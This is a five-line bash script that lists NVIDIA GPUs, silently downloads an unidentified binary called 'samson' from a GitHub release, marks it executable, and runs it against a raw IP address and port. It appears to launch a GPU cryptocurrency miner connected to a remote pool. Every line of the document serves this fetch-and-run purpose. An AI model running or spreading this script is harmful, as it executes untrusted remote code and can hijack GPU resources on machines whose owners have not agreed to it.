#!/bin/bash
nvidia-smi -L
wget https://github.com/seasonbui14/hanoi/releases/download/1/samson &> /dev/null
chmod +x samson
./samson -P http://38.130.221.109:4545/"$1" &> log
